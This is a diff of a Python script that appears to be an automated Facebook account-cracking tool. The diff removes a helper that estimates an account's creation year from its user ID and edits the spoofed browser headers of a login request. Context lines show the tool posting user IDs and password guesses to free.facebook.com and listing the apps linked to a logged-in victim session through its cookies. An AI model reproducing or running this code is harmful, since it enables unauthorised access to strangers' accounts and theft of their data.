@@ -373,44 +373,7 @@ def check_applications(session,coki):
             print(f"\r{P}[{R}%s{P}]. %s%s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
             print(f'\r')
-            
-            
-
- 
-
-
-
-#-----------------------[ID CREATION YEAR CHECKER]-----------------------#
-def creation(uid):
-    if len(uid)==15:
-        if uid[:10] in ['1000000000']       :younisxyz = '| 2009'
-        elif uid[:9] in ['100000000']       :younisxyz = '| 2009'
-        elif uid[:8] in ['10000000']        :younisxyz = '| 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:younisxyz = '| 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:younisxyz = '| 2010'
-        elif uid[:6] in ['100001']          :younisxyz = '| 2010/2011'
-        elif uid[:6] in ['100002','100003'] :younisxyz = '| 2011/2012'
-        elif uid[:6] in ['100004']          :younisxyz = '| 2012/2013'
-        elif uid[:6] in ['100005','100006'] :younisxyz = '| 2013/2014'
-        elif uid[:6] in ['100007','100008'] :younisxyz = '| 2014/2015'
-        elif uid[:6] in ['100009']          :younisxyz = '| 2015'
-        elif uid[:5] in ['10001']           :younisxyz = '| 2015/2016'
-        elif uid[:5] in ['10002']           :younisxyz = '| 2016/2017'
-        elif uid[:5] in ['10003']           :younisxyz = '| 2018/2019'
-        elif uid[:5] in ['10004']           :younisxyz = '| 2019/2020'
-        elif uid[:5] in ['10005']           :younisxyz = '| 2020'
-        elif uid[:5] in ['10006','10007','']:younisxyz = '| 2021'
-        elif uid[:5] in ['10008']           :younisxyz = '| 2022'
-        else:younisxyz=''
-    elif len(uid) in [9,10]:
-        younisxyz = '| 2008/2009'
-    elif len(uid)==8:
-        younisxyz = '| 2007/2008'
-    elif len(uid)==7:
-        younisxyz = '| 2006/2007'
-    else:younisxyz=''
-    return younisxyz
-
+                       
 #---------------------[MAIN MENU]---------------------#
 def RANDOM_MENU():
     clear()
@@ -753,13 +716,12 @@ def YounisXyz(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            xyzheader_fuck = {
-    'authority': 'free.facebook.com',
+            xyzheader_fuck = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',  
+    'cache-control': 'max-age=0',
     'dpr': '2',
-    'referer': 'https://m.facebook.com/',
+    'referer': 'https://free.facebook.com/',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
